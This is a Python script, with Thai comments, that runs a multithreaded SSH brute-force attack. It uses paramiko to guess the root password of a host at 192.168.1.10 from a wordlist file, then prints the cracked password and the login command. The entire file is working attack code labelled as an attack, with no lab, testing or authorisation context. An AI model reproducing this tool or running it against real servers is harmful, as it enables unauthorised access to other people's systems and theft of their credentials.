import paramiko
import threading
import queue
import sys
import os

# -------- CONFIG --------
TARGET_IP = '192.168.1.10'
USERNAME = 'root'
WORDLIST_PATH = 'basic_wordlist.txt'
THREADS = 10
TIMEOUT = 3
# ------------------------

def try_ssh_login(password, result_queue):
    """ฟังก์ชันสำหรับพยายาม SSH ด้วย password ที่ให้มา"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(TARGET_IP, username=USERNAME, password=password, timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
        result_queue.put(('FOUND', password))
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        return False

def worker(password_queue, result_queue, stop_event):
    """Thread worker ที่ดึงรหัสผ่านจาก queue แล้วลอง login"""
    while not stop_event.is_set():
        try:
            password = password_queue.get_nowait()
        except queue.Empty:
            break
        
        if try_ssh_login(password, result_queue):
            stop_event.set()
            break
        password_queue.task_done()

def main():
    print(f"🔥 SSH Brute Force Attack")
    print(f"Target: {USERNAME}@{TARGET_IP}")
    print(f"Wordlist: {WORDLIST_PATH}")
    print(f"Threads: {THREADS}")
    print("=" * 50)
    
    password_queue = queue.Queue()
    result_queue = queue.Queue()
    stop_event = threading.Event()
    threads = []

    try:
        with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                password = line.strip()
                if password:
                    password_queue.put(password)
                
                if line_num % 1000 == 0:
                    print(f"Loaded {line_num} passwords...")
                    
    except FileNotFoundError:
        print(f"❌ Wordlist file '{WORDLIST_PATH}' not found!")
        print("Available wordlists:")
        for f in os.listdir('.'):
            if f.endswith('.txt'):
                print(f"  - {f}")
        return
    
    total_passwords = password_queue.qsize()
    print(f"📝 Loaded {total_passwords} passwords")
    
    for i in range(THREADS):
        t = threading.Thread(target=worker, args=(password_queue, result_queue, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"🚀 Starting attack with {THREADS} threads...")
    
    found_password = None
    while not stop_event.is_set() and not password_queue.empty():
        try:
            if not result_queue.empty():
                status, password = result_queue.get_nowait()
                if status == 'FOUND':
                    found_password = password
                    stop_event.set()
                    break
        except queue.Empty:
            pass
        
        remaining = password_queue.qsize()
        tested = total_passwords - remaining
        if tested > 0 and tested % 100 == 0:
            print(f"Progress: {tested}/{total_passwords} ({tested/total_passwords*100:.1f}%)")
    
    stop_event.set()
    for t in threads:
        t.join(timeout=1)
    
    if found_password:
        print(f"\n✅ SUCCESS! Password found: '{found_password}'")
        print(f"🎯 Login: ssh {USERNAME}@{TARGET_IP}")
        print(f"🔑 Password: {found_password}")
    else:
        print(f"\n❌ Password not found in wordlist")
        print(f"Tested {total_passwords - password_queue.qsize()} passwords")
    
    while not result_queue.empty():
        try:
            status, password = result_queue.get_nowait()
            if status == 'FOUND' and not found_password:
                print(f"\n✅ LATE RESULT: Password found: '{password}'")
        except queue.Empty:
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n⚠️ Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)
